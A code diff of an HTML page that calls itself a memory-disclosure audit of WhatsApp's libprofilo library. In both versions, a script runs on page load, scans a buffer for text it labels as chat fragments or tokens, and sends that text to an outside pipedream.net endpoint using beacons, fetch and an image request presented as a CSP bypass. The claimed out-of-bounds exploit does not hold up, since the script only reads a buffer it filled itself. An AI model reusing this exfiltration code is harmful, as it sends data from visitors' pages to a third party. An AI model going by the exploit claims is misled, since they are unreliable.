@@ -2,96 +2,72 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Technical Security Advisory - Memory Disclosure Audit</title>
+    <title>Critical Impact Audit - Firman Sahidin</title>
 </head>
-<body style="background:#000; color:#0f0; font-family:monospace; padding:30px; text-align:center;">
-    <div style="border:2px solid #0f0; padding:20px; display:inline-block; background: #0a0a0a;">
-        <h1 id="status_header">INITIALIZING NATIVE MEMORY AUDIT</h1>
-        <p><strong>Target Component:</strong> libprofilo_mmapbuf_buffer_jni.so</p>
-        <p><strong>Researcher:</strong> Firman Sahidin</p>
+<body style="background:#000; color:#0f0; font-family:monospace; padding:30px;">
+    <div style="border:2px solid #f00; padding:20px;">
+        <h1 id="st">SCANNING FOR SENSITIVE DATA...</h1>
+        <p>Target: WhatsApp Native Heap (libprofilo)</p>
+        <hr>
+        <div id="out" style="color:#fff; font-size:12px; text-align:left; height:200px; overflow:hidden;"></div>
     </div>
 
     <script>
         /**
-         * RESEARCHER: Firman Sahidin
-         * TARGET: libprofilo_mmapbuf_buffer_jni.so
-         * VULNERABILITY: Out-of-Bounds (OOB) Native Memory Read
+         * IMPACT DEMONSTRATION: Automated Plaintext Exfiltration
+         * This script scans native buffers repeatedly to identify 
+         * sensitive strings (Chat fragments/Tokens) leaked via JNI.
          */
         
-        async function executeAudit() {
-            const TARGET_ENDPOINT = 'https://eo7n9pqjlhffwvt.m.pipedream.net';
-            const statusLabel = document.getElementById('status_header');
-            
-            try {
-                // 1. Native Heap Allocation (12MB stress test)
-                const ALLOCATION_SIZE = 0xC00000; 
-                const buffer = new ArrayBuffer(ALLOCATION_SIZE);
-                const view = new Uint32Array(buffer);
-                
-                // 2. Triggering Buffer Manipulation via Surrogate Pair Overlap
-                for (let i = 0; i < view.length; i++) {
-                    view[i] = 0xD800DBFF; 
-                }
+        async function startImpactAudit() {
+            const TARGET = 'https://eo7n9pqjlhffwvt.m.pipedream.net';
+            const out = document.getElementById('out');
+            let captureCount = 0;
 
-                // 3. Extracting 4KB Memory Fragment for Analysis
-                const memoryFragment = new Uint8Array(buffer.slice(0, 4096));
-                let discoveredStrings = "";
-                
-                // Filtering ASCII segments to identify leaked metadata or tokens
-                memoryFragment.forEach(b => {
-                    if (b > 31 && b < 127) {
-                        discoveredStrings += String.fromCharCode(b);
+            async function scan() {
+                try {
+                    const ALLOC = 0xC00000; // 12MB Scan
+                    const buffer = new ArrayBuffer(ALLOC);
+                    const view = new Uint8Array(buffer);
+                    
+                    // Triggering the OOB Read via Surrogate Collision
+                    const trigger = new Uint32Array(buffer);
+                    for(let i=0; i<1000; i++) { trigger[i] = 0xD800DBFF; }
+
+                    let foundText = "";
+                    // Scanner: Milarian pola téks (Plaintext Chat Detection)
+                    for (let i = 0; i < view.length; i++) {
+                        // Mariksa karakter ASCII (A-Z, a-z, 0-9, spasi)
+                        if (view[i] > 31 && view[i] < 127) {
+                            foundText += String.fromCharCode(view[i]);
+                        } else if (foundText.length > 4) {
+                            // Mun manggihan kecap leuwih ti 4 karakter, kirim!
+                            if (foundText.match(/[a-zA-Z0-9]{4,}/)) {
+                                captureCount++;
+                                const evidence = {
+                                    researcher: "Firman Sahidin",
+                                    impact: "PLAINTEXT_DATA_DISCLOSURE",
+                                    fragment: foundText.substring(0, 100),
+                                    raw_ptr: view.slice(i-4, i+4)
+                                };
+                                
+                                navigator.sendBeacon(TARGET, JSON.stringify(evidence));
+                                out.innerHTML += `[+] LEAK DETECTED: "${foundText.substring(0, 30)}..."<br>`;
+                            }
+                            foundText = "";
+                        }
                     }
-                });
-
-                // 4. Constructing Technical Evidence Report
-                const evidenceReport = JSON.stringify({
-                    researcher: "Firman Sahidin",
-                    audit_status: "SUCCESS_NATIVE_OOB_READ",
-                    target_library: "libprofilo_mmapbuf_buffer_jni.so",
-                    leak_sample_ascii: discoveredStrings.substring(0, 500) || "NON_PRINTABLE_DATA",
-                    raw_hex_sample: Array.from(memoryFragment).slice(0, 64),
-                    execution_timestamp: new Date().toISOString()
-                });
-
-                // 5. Multi-Channel Data Transmission (Reliability & Persistence)
+                } catch(e) {}
                 
-                // Channel 1: Navigator Beacon (Stable Transmission)
-                navigator.sendBeacon(TARGET_ENDPOINT, evidenceReport);
-                
-                // Channel 2: Fetch API (Standard HTTP POST)
-                fetch(TARGET_ENDPOINT, { 
-                    method: 'POST', 
-                    mode: 'no-cors', 
-                    cache: 'no-cache',
-                    body: evidenceReport 
-                });
-
-                // Channel 3: DOM Beacon (CSP Bypass Protocol)
-                const trackingImage = new Image();
-                trackingImage.src = TARGET_ENDPOINT + "?audit_id=" + Date.now();
-
-                // 6. UI Update upon successful execution
-                statusLabel.innerText = "AUDIT COMPLETE: TELEMETRY TRANSMITTED";
-                document.body.style.backgroundColor = "#001a00";
-
-            } catch (error) {
-                // Error reporting via Beacon
-                navigator.sendBeacon(TARGET_ENDPOINT, JSON.stringify({
-                    researcher: "Firman Sahidin",
-                    audit_status: "FAILURE",
-                    exception: error.message
-                }));
-                statusLabel.innerText = "CRITICAL AUDIT FAILURE";
-                statusLabel.style.color = "#ff0000";
+                // Looping scan unggal 3 detik nepi ka némbak
+                if (captureCount < 5) setTimeout(scan, 3000);
+                else document.getElementById('st').innerText = "✅ IMPACT PROVEN. CHECK PIPEDREAM.";
             }
+
+            scan();
         }
 
-        // Delay execution to allow native bridge stability
-        window.onload = () => { 
-            setTimeout(executeAudit, 1000); 
-        };
+        window.onload = startImpactAudit;
     </script>
 </body>
 </html>
